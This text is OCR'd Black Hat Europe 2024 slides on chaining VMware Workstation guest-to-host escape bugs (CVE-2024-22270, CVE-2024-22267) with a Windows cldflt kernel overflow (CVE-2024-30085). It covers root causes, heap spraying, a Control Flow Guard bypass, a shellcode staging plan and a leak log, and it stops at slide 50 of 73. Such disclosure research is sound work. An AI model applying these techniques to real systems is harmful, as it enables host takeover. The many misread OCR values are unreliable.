---
title: "Guest Revolution Chaining 3-bugs to compromise the Windows kernel from the VMware guest"
speakers: ["Junoh Lee", "Gwangun Jung"]
conference: "Black Hat"
conference_full: "Black Hat Europe 2024"
edition: "Europe"
year: 2024
source_pdf: "BlackHat_Europe_2024_slides/Junoh Lee & Gwangun Jung_Guest Revolution Chaining 3-bugs to compromise the Windows kernel from the VMware guest.pdf"
pages: 73
sha256: "ea1a4a0849caf32c8c540bcf7d28f81b22efd120856e3629be69cb620e01960d"
text_chars: 28380
ocr_pages: 57
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.2
ocr_unreliable_blocks: 0
vision_verified_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:59:27Z"
---
# Guest Revolution Chaining 3-bugs to compromise the Windows kernel from the VMware guest

**Speakers:** Junoh Lee, Gwangun Jung  
**Conference:** Black Hat Europe 2024  
**Source:** `BlackHat_Europe_2024_slides/Junoh Lee & Gwangun Jung_Guest Revolution Chaining 3-bugs to compromise the Windows kernel from the VMware guest.pdf` (73 pages)


## Slide 1

## Guest Revolution: Chaining 3-bugs to compromise the Windows kernel from the VMware guest

Speakers: Junoh Lee, Gwangun Jung

#BHEU @BlackHatEvents

## Slide 2

# Agenda

-

-

-

-

-

-

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Agenda
1. Introduction
Image by DALL-E
2. Pwning VMware Workstation
¢« VM escape overview
¢ HGFS Uninitialized Heap Leakage (CVE-2024-22270)
¢ VBluetooth URB Use-After-Free (CVE-2024-22267)
3. Windows Kernel Exploit
¢ Cldflt Heap Buffer Overflow (CVE-2024-30085)
¢ Hunting Universal Heap Spray Object
¢ Exploitation Strategy
4. Chaining Exploits
5. Conclusion
Information Classification: General 2
```

## Slide 3

#BHEU @BlackHatEvents

## Slide 4

# Who are we ?

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Who are we ?
Junoh Lee Gwangun Jung
Researcher Researcher
theori
Information Classification: General 1 4
```

## Slide 5

# Pwn2Own 2024 Virtualization Category

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Pwn2Own 2024 Virtualization Category
Targets:
. Master of Pwn Eligible for Add-
Target Prize . .
Points on Prize
Oracle VirtualBox $40,000 4 Yes
VMware Workstation $80,000 8 Yes
VMware ESXi $150,000 15 No
Microsoft Hyper-V Client $250,000 25 Yes
Available Add-on Prizes:
Add-on Prize Prize Master of Pwn Points
Escalation of privilege leveraging a
Windows kernel vulnerability on the $50,000 5
host operating system.
Information Classification: General 5
```

## Slide 6

#BHEU @BlackHatEvents

## Slide 7

# VM escape overview

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
VM escape overview
Type 1 and Type 2 hypervisors
Hyper-v WS/Fusion
e Hypervisor Hypervisor .
iy ESXi Vy VirtualBox
```

## Slide 8

# VM escape overview

•
•
•
•
•

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
VM escape overview
What is VM escape?
Sandbox
VM vmware-vmx vmware-vmx
Host
OS / Hardware
Information Classification: General
Code Execution
File read/write
Information leak
Denial of Service
Etc..
```

## Slide 9

# Hypervisor attack surface

Information Classification: General

#BHEU @BlackHatEvents

## Slide 10

# Hypervisor attack surface

Information Classification: General

#BHEU @BlackHatEvents

## Slide 11

# Hypervisor attack surface

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Hypervisor attack surface
Heap OOB Read
VM Escape CVEs (2023~2024)
VGA
Use After Free
Information Classification: General (CVE-2024-22267) 11
```

## Slide 12

# Hypervisor attack surface

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Hypervisor attack surface
ee Heap CSB React Self-patch in 17.5.1
VM Escape CVEs (2023~2024)
VGA
Use After Free
(CVE-2024-22267)
```

## Slide 13

# Hypervisor attack surface

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Hypervisor attack surface
ee Heap CSB React Self-patch in 17.5.1
VM Escape CVEs (2023~2024)
VGA
Uninitialized Heap
(CVE-2024-22270)
Use After Free
(CVE-2024-22267)
Information Classification: General 1 1 3
```

## Slide 14

### HGFS Uninitialized heap leakage (CVE-2024-22270)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HGFS Uninitialized heap leakage (CVE-2024-22270)
Host Guest File Sharing (HGFS)
Folder sharing
Guest tools
f, Shared folders expose your files to programs in the virtual machine.
: 5 This may put your computer and your data at risk. Only enable
shared folders if you trust the virtual machine with your data.
VMCI / Backdoor ©)Disabled
zs © Always enabled
Enabled until next power off or suspend
Host RPC Handlers
. Folders
Inf Confi HGFS Name Host Path
Host File System
Host
OS / Hardware
Add... Remove Properties
Information Classification: General 14
```

## Slide 15

### HGFS Uninitialized heap leakage (CVE-2024-22270)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HGFS Uninitialized heap leakage (CVE-2024-22270)
Root cause analysis (1)
HGFS v1 Response (size=0x41)
char hgfs_fileread(struct hgfs_req *req, _BYTE *a2){
Block = OLL; 0x00 0x08
rep = OLL;
// Copy file contents to Physmem 0x20
PhysMem_CopyToMemory_O(*(a2 + 51), v24, v6, 32, 5u);
if (req->version == 1 )
data_size = Ox29LL;
else if (req->version == 2 ) 0x40
data_size = Ox51LL;
else
data_size = OLL;
// Allocate a HGFS Response buffer
resp = _malloc(data_size + 0x18);
— malloc doesn't initialize allocated buffer
Information Classification: General 15
```

## Slide 16

### HGFS Uninitialized heap leakage (CVE-2024-22270)

0xD00000000 qword44
data_size version 2
v9

Information Classification: General

#BHEU @BlackHatEvents

## Slide 17

### HGFS Uninitialized heap leakage (CVE-2024-22270)

-

-

-

- ➢

-

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HGFS Uninitialized heap leakage (CVE-2024-22270)
Trigger and exploit in Windows guest
¢« HGFS over VMCl is closed source
* open-vm-tools project only contains HGFS client over backdoor
¢ Windows guest tools is only use HGFS protocol version 2
```

## Slide 18

### HGFS Uninitialized heap leakage (CVE-2024-22270)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HGFS Uninitialized heap leakage (CVE-2024-22270)
Trigger and exploit in Windows guest
Windows Filesystem hgfs.sys (filter driver) vmware-vmx
enter NtReadFile() HGFS v2 Request
build_hgfs_pkt(.., ver, seq) ae
hgfs_fileread
a vmci_resp_send
read_vmci_pkt(resp)
"~~ HGFS v2 Response
return NtReadFile()
read file from
\\vmware-host
Information Classification: General 18
```

## Slide 19

### HGFS Uninitialized heap leakage (CVE-2024-22270)

#BHEU @BlackHatEvents

Information Classification: General


> Recovered by OCR — confidence 88/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HGFS Uninitialized heap leakage (CVE-2024-22270)
Trigger and exploit in Windows guest
Windows Filesystem hgfs.sys (filter driver) vmware-vmx
enter NtReadFile() HGFS v2 Request
hgfs_fileread
read file from
i: i HGFS v1 Response
; HGFS v2 Response:
return NtReadFile() i backup:
: uninitialized :
data
kernel hook
Information Classification: General 19
```

## Slide 20

### HGFS Uninitialized heap leakage (CVE-2024-22270)

#BHEU @BlackHatEvents

Information Classification: General


> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HGFS Uninitialized heap leakage (CVE-2024-22270)
Trigger and exploit in Windows guest
Windows Filesystem hgfs.sys (filter driver) vmware-vmx
spray CD-ROM
associated objects
enter NtReadFile() HGFS v2 Request
build_hgfs_pkt(.., ver, seq) -----... — *, HGFS v1 Request
hgfs_fileread
read file from
i: i HGFS v1 Response
; HGFS v2 Response:
return NtReadFile() i backup:
: uninitialized :
read vmware-vmx address <« = data
kernel hook
Information Classification: General 20
```

## Slide 21

### HGFS Uninitialized heap leakage (CVE-2024-22270)

#BHEU @BlackHatEvents

Information Classification: General


> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HGFS Uninitialized heap leakage (CVE-2024-22270)
Trigger and exploit in Windows guest
Windows Filesystem hgfs.sys (filter driver) vmware-vmx
spray CD-ROM
associated objects
enter NtReadFile() HGFS v2 Request
build_hgfs_pkt(.., ver, seq) -----... — *, HGFS v1 Request
hgfs_fileread
read file from
i: i HGFS v1 Response
; HGFS v2 Response:
return NtReadFile() i backup:
: uninitialized :
read vmware-vmx address <« = data
kernel hook
Information Classification: General ?1
```

## Slide 22

### HGFS Uninitialized heap leakage (CVE-2024-22270)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HGFS Uninitialized heap leakage (CVE-2024-22270)
Trigger and exploit in Windows guest
[+] Patch VM drivers to trigger
[-] Patch vmhgfs.sys Offset 0x1000
[-] Patch vmhgfs.sys Offset OxabbO
[-] Patch vmhgfs.sys Offset 0x1053
[-] Patch vmhgfs.sys Offset Oxa1d9
[+] Create a file in shared folder
[-] File : \\wmware-host\Shared Folders\data\pwn2own_leak.txt
[+] Trigger a leak bug
[-] Prepare Heap
[-] trigger leak bug multiple time..
[!] Leaked address : O0O007FF69AC24C70
[!] vmware-vmx.exe base address : OO007FF69A990000
Now, we know base address of vmware-vmx &
Information Classification: General 22
```

## Slide 23

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
VBliuetooth URB Use-After-Free (CVE-2024-22267)
VMware Virtual Bluetooth Overview
Client Driver Virtual Bluetooth
s USB Interface
Universal Bus Driver (USBD) (URB Processing)
I
USB Controller DATA URB Control URB
I
Virtual Hub Virtual Virtual Device Vendor
Mouse Bluetooth Command Command
a Bluetooth Packet Processing
OS / Hardware
Remote Bluetooth
Devices
Information Classification: General
23
```

## Slide 24

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
VBliuetooth URB Use-After-Free (CVE-2024-22267)
VMware Virtual Bluetooth Overview
Client Driver Virtual Bluetooth
s USB Interface
Universal Bus Driver (USBD) (URB Processing)
I
USB Controller } DATAURB Control URB
Virtual Hub Virtual Virtual : Device Vendor :
Mouse Bluetooth : Command Command _|:
a Bluetooth Packet Processing
OS / Hardware
Remote Bluetooth
Devices
Information Classification: General
24
```

## Slide 25

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
VBliuetooth URB Use-After-Free (CVE-2024-22267)
Root cause analysis (1)
—int64 VBluetooth_SubmitUrb(vurb *urb){
pipe = urb->pipe;
bufferLen = urb->bufferLen;
data = urb->data;
dev = pipe->dev; rbufQueue * VUsbQueue_SubmitURB(pools *pool, vurb *urb){
urb->status = 0; node = AllocNode(pool->node_len);
urb->actualLen = bufferLen; if (node )
endpoint = pipe->endpoint; {
if (endpoint ) tail = pool->tail;
{ if ( tail)
if (endpoint == 0x81) *tail = node;
return VUsbQueue_SubmitURB(&dev->queued, urb); else
if (endpoint == 0x82 ) pool->head = &node->next;
return VUsbQueue_SubmitURB(&dev->queued, urb); node_len = pool->node_len;
} pool->tail = (signed _int64)node; Ae
memcpy(&node->pUrb, &urb, node_len - 8): ] =
} No increase the reference counter of URB object
return VUsbQueue_HandleURBs(pool);
}
Information Classification: General 25
```

## Slide 26

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
VBliuetooth URB Use-After-Free (CVE-2024-22267)
Root cause analysis (2)
rbufQueue VUsbQueue_HandleURBs(pools *pool){
curr_node = pool->head;
if ( curr_node ){
while (1 ){ VUsbQueue_SubmitURB
urb = curr_node->pUrb;
// handle a urb object VUsbQueue_HandleURBs
PooledLinkList_FreeNode(curr_node, pool);
Poll_Callback(1, 2, VUsbCompleteUrb, urb, ...); job 0
Register a job to polling queue Poll_Callback
curr_node = (rbufQueue *)pool->head;
if ( !curr_node ) jobn
return curr_node;
} VUsbComplete
UrbHandler
Information Classification: General 26
```

## Slide 27

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pis hat
VBluetooth URB Use-After-Free (CVE-2024-22267)
Reset the USB device
_int64 _ fastcall VBluetooth_SubmitUrb(vurb *urb) void VUsb_DeviceReset(VUsbDevice *dev)
{ {
if (endpointAddress ) Ls ipeArray = &dev->pipeArray[20]-
{ VUsb_ResetPortPipe(pipeArray):
/* handle a non control URB and return */ }
/* handle a control URB */ |
if ( (urbData->bmRequestType & 0x60) != 0x20)
{ VUSBDevice
( (requestType == 9 ) destroy all pipes and URB objects
{
if (urbData->wValue )
return (g_usb_func_table->vusbCompleteUrb)(urb);
}
Information Classification: General
27
```

## Slide 28

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
VBliuetooth URB Use-After-Free (CVE-2024-22267)
Trigger Use-After-Free (1)
URB(data)
Add a URB into the queue without increasing reference counter
VUsbQueue_SubmitURB
VUsbQueue_HandleURBs
28
Poll_Callback
VUsbCompleteUrb
URB(data)
```

## Slide 29

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
VBliuetooth URB Use-After-Free (CVE-2024-22267)
Trigger Use-After-Free (2)
URB(data)
VUsbQueue_SubmitURB
VUsbQueue_HandleURBs
URB(reset) - VUsbQueue_SubmitURB = |= = Time Slice
Vbluetooth_Reset
PutURB
(Unref urbs in VBlueTooth)
VUsbCompleteUrb URB(data)
```

## Slide 30

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
VBliuetooth URB Use-After-Free (CVE-2024-22267)
Trigger Use-After-Free (3)
URB(data)
VUsbQueue_SubmitURB
VUsbQueue_HandleURBs
URB(reset) > VUsbQueue_SubmitURB Time Slice
Vbluetooth_Reset
_int64 VMCl_out(struct_vmci_data *vmci_data, ...) PutURB
{ / (Unref urbs in VBlueTooth)
buf = malloc(vimci_out->datasize + 24LL); .
vmci_data->buf = buf; spray object
if (buf) guest controllable!
memecpy(buf, fecv_data, recv_size); | _
vmci_data->byte60 = 7, VUsbCompleteUrb Fake URB
vmci_data->recv_size = recv_size; P (VMCI buffer)
vmci_data->totalsize = in_pkt_size;
Information Classification: General 30
```

## Slide 31

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 78/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
VBliuetooth URB Use-After-Free (CVE-2024-22267)
Trigger Use-After-Free (4)
char __fastcall VUsb_CompleteUrbAddBatch(vurb *urb) Name Base address Size CFE Guard
{ called by VUsbCompleteUrb
pipe = urb->pipe; // [urb + 18h] > advapi32.dll Ox7ffes4600... 712 kB CF Guard
data = urb->data; cfgmgr32.dll ox7ffe53850... 312kB CF Guard
pipe->stalled && urb->status == 3) > dsound.dll OxFffd93550... 648 kB CF Guard
urb->status = 4; liberypto-3-x64.dll Oxvfid635c0... 5.01 MB
if (urb->status == 6 ) libssI-3-x64.dll ox7fid93480... 780 kB
I}... oleaut32. dll ox7ffes5860 860 kB CF Guard
Use this indirect call, we can control rip
yen ° > Need to bypass Control Flow Guard (CFG)
Information Classification: General 31
```

## Slide 32

### VBluetooth URB Use-After-Free (CVE-2024-22267)

-

-

Information Classification: General

#BHEU @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
VBluetooth URB Use-After-Free (CVE-2024-22267)

Bypass Control Flow Guard
• To bypass CFG, we need to use ROP based CFG gadget
    1. Callable by indirect call
    2. After execute some code then execute indirect call
• URB object size is 0xA8, we need to pivot arg0 to guest controllable memory

[Panel] Guest physical memory                              First page of physical memory is not used after boot !!
0:017> !address 0000020f`dbcc0000
Usage:              MappedFile
Base Address:       0000020f`dbcc0000
End Address:        00000213`dbcc0000
Region Size:        00000004`00000000 (  16.000 GB)
State:               00001000        MEM_COMMIT
Protect:             00000004        PAGE_READWRITE
Type:                00040000        MEM_MAPPED
Mapped file name:    \VM\564da3e5-f094-836e-1d4e-4865805828f0.vmem

[diagram bar: .data | Mapped File]                         Guest' physical memory base is in .data section of vmware-vmx.
0:015> dq vmware_vmx + 0x15A99A0
00007ff7`974699a0  0000020f`dbcc0000 00000000`00000000
```

## Slide 33

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pis hat
VBliuetooth URB Use-After-Free (CVE-2024-22267)
fake URB
Call an arbitrary CFG gadget
&pipe
pipe = urb->pipe; // [urb + 18h]
data = urb->data;
dev = pipe->dev; // [pipe + 20h]
vmware-vmx(.data)
pipe->stalled && urb->status == 3 ) >
urb->status = 4; fake pipe
if (urb->status == 6 )
{
if (urb->hcpriv ) &dev
return 0; &unk_ob|
} 0x20
fake dev (= physmem )
Information Classification: General
33
```

## Slide 34

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pis hat
VBliuetooth URB Use-After-Free (CVE-2024-22267)
fake URB
Call an arbitrary CFG gadget
char _fastcall VUsb_CompleteUrbAddBatch(vurb *urb)
{
pipe = urb->pipe; // [urb + 18h] vmware-vmx(.data)
data = urb->data; unk_obj
dev = pipe->dev; // [pipe + 20h]
if (unknown_flag && urb->type &&
pipe->stalled && urb->status == 3 ) .
urb->status = 4; fake pipe
{ -
if ( urb->hcpriv ) ae | &vtable, adev_|
/| 0x00 =
return O;
} 0x20 ;
vtable[4] physmem is guest controllable
vtable (= fake dev, physmem )
os Ccctteat Now, we can call an arbitrary gadget
Information Classification: General 34
```

## Slide 35

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pis hat
VBluetooth URB Use-After-Free (CVE-2024-22267)
. . fake URB
Pivoting argO to Guest's physmem
f mov rex, [rax] rcx == next argO == physmem
pine rax, [rex] rax point to .data section oo \ vmware-vmx(.data)
return (*(***(urb + 0x10) + 0x160))(**(urb + 0x10)): physmem
}
.data section is not guest controllable 'C On >
.data &unk_obj
0x20
gadget_O
Information Classification: General
argO (= vtable, fake dev, physmem )
35
```

## Slide 36

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
VBluetooth URB Use-After-Free (CVE-2024-22267)
fake URB
Pivoting argO to Guest's physmem
_int64 gadget_O(_int64 urb) {// sub_140323F50 &physmem | &pipe
/mov rex, [rax] rcx == next argO == physmem
return (*(***(urb + 0x10) + 0x160))(**(urb + 0x10)): physmem
}
_int64 gadget_1(_int64 phys) {// sub_140295230 veer
feturn (*(phys + 0x380))(phys); _} gadget_2 = *(phys+0x380) 0x00 “ —
} data &unk_obj gaaget_
0x20
gadget_O
gadget_2
Information Classification: General
argO (= vtable, fake dev, physmem )
36
```

## Slide 37

### VBluetooth URB Use-After-Free (CVE-2024-22267)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
VBluetooth URB Use-After-Free (CVE-2024-22267)
fake URB
Pivoting argO to Guest's physmem
_int64 gadget_O(_int64 urb) {// sub_140323F50
[ &physmem &pipe
f mov rex, [rax] rex == next argO == physmem
_int64 gadget_1(_int64 phys) {// sub_140295230 cues
feturn (*(phys + 0x380))(phys);_] gadget_2 = *(phys+0x380) | 9,09 c ; gadget_1
} .data &unk_obj -
0x20
gadget_O
gadget_2
argO (= vtable, fake dev, physmem )
37
Information Classification: General
```

## Slide 38

### VBluetooth URB Use-After-Free (CVE-2024-22267)

-

- ➢

-

- ➢

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pis hat
VBliuetooth URB Use-After-Free (CVE-2024-22267)
Bypass Control Flow Guard
If the payload is well organized, VMware UAF does not cause panic ©
* vmware-vmx loads non-CFG libraries
Name Base address Size CF Guard
crypt32.dll Ox7ffe53cd0... 1.4MB CF Guard
> dsound.dll Ox?ffd93550... 648 kB CF Guard
libssl-3-x64. dll Ox7ffd934e0... 780 kB
Information Classification: General 38
```

## Slide 39

### VBluetooth URB Use-After-Free (CVE-2024-22267)

-

-

-

-

-

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
VBliuetooth URB Use-After-Free (CVE-2024-22267)
Run Shelicode with CFG based ROP
1. Read physical memory base
¢ Itis used by arbitrary memory read/write through memcpy gadget
2. Read kernel32!VirtualProtect, libcrypto module address.
* memcpy(physmem+off, IAT+Off, ...);
¢ ReadPhys(physmem+off, ...) from guest
3. Call VirtualProtect(unused space, ..., PAGE_LEXECUTE_READWRITE. ...):
4. Copy shellcode to unused space
¢ WritePhys(physmem+off, ...) from guest
* memcpy(unused space , physmem + Off, ...);
// set rcx to shellcode address
jmp rex ; switch jump
5. Finally, jump to shellcode using libcrypto’s gadget.
Information Classification: General 39
```

## Slide 40

#BHEU @BlackHatEvents

## Slide 41

# Cloud Files Mini Filter (CLDFLT)

-

-

-

-

-

-

-

-

-

-

-

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Cloud Files Mini Filter (CLDFLT)
¢ File System minifilter driver used by OneDrive
¢ Relatively large attack surface
¢ ~ 900+ functions
* Various file operation filters
* File system placeholder stuffs
¢ Filter Communication Ports
¢ There exists successful exploits
* Blog Post (Star Labs, CVE-2021-31969)
* Pwn2own 2023 (Synacktiv, CVE-2023-29361)
¢ ITW 2023 (Unknown, CVE-2023-36036)
Information Classification: General 41
```

## Slide 42

# Bug Finding Process

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bug Finding Process
CLDFLT Reparse Point Data Vulnerability
CVE-2021-31969 CVE-2023-36036 = This Bug
(ZDI, Star labs Blog) (ITW)
https://www.zerodayinitiative.com/blog/2021/7/19/cve-2021-31969-underflowing-in-the-clouds
Information Classification: General 42
```

## Slide 43

# Storing CLDFLT Reparse Point Data

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Storing CLDFLT Reparse Point Data
buffer->ReparseTag = IOLREPARSE_TAG_CLOUD_3
Tag that triggers the filter
NtFsControlFile(hDir,
FSCTL_SET_REPARSE_POINT,
buffer,
buffer_len):
```

## Slide 44

# CLDFLT Reparse Point Data Structure

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CLDFLT Reparse Point Data Structure
struct LHSM_DATA
{ struct LHSM_ELEMENT_INFO
DWORD Magic; {
DWORD Crc32; USHORT Type;
USHORT Flags; DWORD Offset;
USHORT NumberOfElements; };
HSM_ELEMENT_INFO Elementinfos[10];
};
Header
(HSM_ELEMENT_INFOs)
ElementO Elementi Element3
https://starlabs.sg/blog/2023/11-exploitation-of-a-kernel-pool-overflow-from-a-restrictive-chunk-size-cve-2021-31969/
Information Classification: General 44
```

## Slide 45

### CLDFLT Heap Buffer Overflow (CVE-2024-30085)

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CLDFLT Heap Buffer Overflow (CVE-2024-30085)
_int64 HsmlBitmapNORMALOpen() {
if ( elem4_buffer &8 elem4_length - 1 <= OxFFE ) Meaningless Condition va!
{
}
else
{
v40 = ExAllocatePoolWithTag(PagedPool, 0x1000ui64, 0x6D427348u);
memmove(v40, elem4_buffer, elem4_length); | Overflow if elem4 length > 0x1000
goto LABEL_87; ~
}
}
Information Classification: General 4 5
```

## Slide 46

# No Validation?

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Information Classification: General
No Validation?
bool HsmpBitmaplsReparseBufferSupported() {
[ clem2_byte = *((_BYTE *)&hsm_data->Magic + elem2_offset);
if (elem2_byte
&& (hsm_data->NumberOfElements < 4u Doesn't perform
|| hsm_data->Elementinfos[4].Length > 0x1000u) )
{
goto ERROR;
}
validation if elem2[0] ==
46
```

## Slide 47

# What Can We Do?

-

-

-

-

-

-

-

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What Can We Do?
¢« Heap based buffer overflow on fixed size chunk (0x1000)
¢ How many bytes?
¢ Almost 0x4000 bytes
¢ Actually more, because we can compress the reparse point data
int HsmpRpReadBuffer()
{
v9 = FltFsControlFile(Instance, FileObject, FSCTL_.GET_REPARSE_POINT,
* Wecan overflow with arbitrary data
¢ By setting cldflt reparse point data
Information Classification: General 47
```

## Slide 48

# What Can We Do?

•

•

•

•

•

•

•

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What Can We Do?
¢« Heap based buffer overflow on fixed size chunk (0x1000)
Exploit Time
* Wecan overflow with arbitrary data
¢ By setting cldflt reparse point data
Information Classification: General 4 8
```

## Slide 49

# WNF_STATE_DATA

-

-

-

-

-

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WNF_STATE_DATA
¢ Well-known objects in Windows kernel exploits (with Token Object AARW)
¢ Used for Heap Spray in Paged Pool
¢ If DataSize is overwritten, we can do:
* OOB Write with NtUpdateWnfStateData
¢ OOB Read with NtQueryWnfStateData
struct WNF_STATE_DATA
{
struct [WNF_NODE_HEADER Header;
ULONG AllocatedSize;
ULONG DataSize;
ULONG ChangeStamp;
Information Classification: General 49
```

## Slide 50

# WNF_STATE_DATA

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WNF_STATE_DATA
But, the object has a maximum size limit...
unsigned int MaxDataSize _int64 _ fastcall ExoWnfCreateNamelnstance(
PSECURITY_DESCRIPTOR a7) -WNF_SCOPE_INSTANCE *a1,
{ _WNF_STATE_NAME_STRUCT a2,
. _int32 *MaxDataSize,
if (MaxDataSize > 0x1000 ) -EPROCESS *a4,
StateName = 0xC000000D; {
} WNI->StateNamelnfo.MaxStateSize = *MaxDataSize;
